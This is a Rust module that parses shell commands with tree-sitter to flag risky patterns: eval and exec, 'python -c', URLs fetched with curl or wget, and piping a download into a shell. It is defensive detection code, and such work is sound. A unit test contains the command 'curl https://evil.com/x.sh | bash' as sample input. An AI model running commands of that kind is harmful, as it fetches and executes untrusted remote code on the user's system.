use std::collections::HashSet;

use serde::{Deserialize, Serialize};
use streaming_iterator::StreamingIterator;
use thiserror::Error;
use tree_sitter::{Node, Parser, Query, QueryCursor};

#[derive(Debug, Error)]
pub enum AstError {
    #[error("failed to set bash grammar: {0}")]
    Grammar(String),
    #[error("parse failed")]
    ParseFailed,
}

/// Structured intermediate representation of a shell command.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CommandIr {
    pub pipelines: Vec<Pipeline>,
    pub has_command_substitution: bool,
    pub has_heredoc: bool,
    pub indirect_executors: Vec<String>,
    pub external_urls: Vec<String>,
    pub pipe_to_shell: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Pipeline {
    pub commands: Vec<CommandNode>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CommandNode {
    pub name: String,
    pub args: Vec<String>,
    pub redirects: Vec<String>,
}

/// Parse bash/sh commands into a security-oriented IR.
pub struct BashParser {
    parser: Parser,
}

impl BashParser {
    pub fn new() -> Result<Self, AstError> {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_bash::LANGUAGE.into())
            .map_err(|e| AstError::Grammar(e.to_string()))?;
        Ok(Self { parser })
    }

    pub fn parse(&mut self, source: &str) -> Result<CommandIr, AstError> {
        let tree = self
            .parser
            .parse(source, None)
            .ok_or(AstError::ParseFailed)?;
        let root = tree.root_node();
        Ok(build_ir(source, &root))
    }
}

fn build_ir(source: &str, root: &Node) -> CommandIr {
    let mut ir = CommandIr::default();
    let mut current_pipeline = Pipeline::default();

    walk_node(source, *root, &mut ir, &mut current_pipeline);

    if !current_pipeline.commands.is_empty() {
        ir.pipelines.push(current_pipeline);
    }

    detect_pipe_to_shell(&mut ir);
    ir
}

fn walk_node(source: &str, node: Node, ir: &mut CommandIr, pipeline: &mut Pipeline) {
    match node.kind() {
        "pipeline" => {
            let mut inner = Pipeline::default();
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, &mut inner);
            }
            if !inner.commands.is_empty() {
                ir.pipelines.push(inner);
            }
        }
        "command" | "declaration_command" => {
            if let Some(cmd) = extract_command(source, &node, ir) {
                pipeline.commands.push(cmd);
            }
        }
        "command_substitution" => {
            ir.has_command_substitution = true;
        }
        "heredoc_body" | "heredoc_redirect" => {
            ir.has_heredoc = true;
        }
        _ => {
            for child in node.children(&mut node.walk()) {
                walk_node(source, child, ir, pipeline);
            }
        }
    }
}

fn extract_command(source: &str, node: &Node, ir: &mut CommandIr) -> Option<CommandNode> {
    let mut name = String::new();
    let mut args = Vec::new();

    for child in node.children(&mut node.walk()) {
        match child.kind() {
            "command_name" | "declaration_command" => {
                if name.is_empty() {
                    name = node_text(source, &child);
                }
            }
            "word" | "string" | "raw_string" | "concatenation" => {
                let text = node_text(source, &child);
                if name.is_empty() {
                    name = text;
                } else {
                    args.push(text);
                }
            }
            "redirected_statement" => {
                for sub in child.children(&mut child.walk()) {
                    if sub.kind() == "file_redirect" {
                        args.push(node_text(source, &sub));
                    }
                }
            }
            _ => {}
        }
    }

    if name.is_empty() {
        return None;
    }

    let indirect = ["eval", "source", ".", "exec", "bash", "sh", "zsh", "dash"];
    if indirect.contains(&name.as_str()) {
        ir.indirect_executors.push(name.clone());
    }

    if matches!(
        name.as_str(),
        "python" | "python3" | "node" | "perl" | "ruby"
    ) && args.iter().any(|a| a == "-c" || a == "-e")
    {
        ir.indirect_executors.push(format!("{name} -c"));
    }

    if matches!(name.as_str(), "curl" | "wget" | "fetch") {
        for arg in &args {
            if arg.starts_with("http://") || arg.starts_with("https://") {
                ir.external_urls.push(arg.clone());
            }
        }
    }

    Some(CommandNode {
        name,
        args,
        redirects: Vec::new(),
    })
}

fn node_text(source: &str, node: &Node) -> String {
    source[node.start_byte()..node.end_byte()].to_string()
}

fn detect_pipe_to_shell(ir: &mut CommandIr) {
    let shells: HashSet<&str> = ["bash", "sh", "zsh", "dash", "fish"].into_iter().collect();
    for pipeline in &ir.pipelines {
        let cmds: Vec<&str> = pipeline.commands.iter().map(|c| c.name.as_str()).collect();
        if cmds.len() < 2 {
            continue;
        }
        let last = cmds.last().copied().unwrap_or_default();
        if shells.contains(last) {
            let fetchers = ["curl", "wget", "cat", "echo", "base64"];
            if cmds.iter().any(|c| fetchers.contains(c)) {
                ir.pipe_to_shell = true;
            }
        }
    }
}

/// Run tree-sitter queries against a command for pattern detection.
pub fn match_patterns(source: &str, queries: &[&str]) -> Vec<String> {
    let mut parser = match BashParser::new() {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    let tree = match parser.parser.parse(source, None) {
        Some(t) => t,
        None => return Vec::new(),
    };

    let mut matched = Vec::new();
    for (i, query_src) in queries.iter().enumerate() {
        if let Ok(query) = Query::new(&tree_sitter_bash::LANGUAGE.into(), query_src) {
            let mut cursor = QueryCursor::new();
            let mut matches = cursor.matches(&query, tree.root_node(), source.as_bytes());
            if matches.next().is_some() {
                matched.push(format!("query-{i}"));
            }
        }
    }
    matched
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_simple_command() {
        let mut parser = BashParser::new().unwrap();
        let ir = parser.parse("ls -la").unwrap();
        assert_eq!(ir.pipelines.len(), 1);
        assert_eq!(ir.pipelines[0].commands[0].name, "ls");
    }

    #[test]
    fn detects_pipe_to_shell() {
        let mut parser = BashParser::new().unwrap();
        let ir = parser.parse("curl https://evil.com/x.sh | bash").unwrap();
        assert!(ir.pipe_to_shell);
        assert!(!ir.external_urls.is_empty());
    }
}
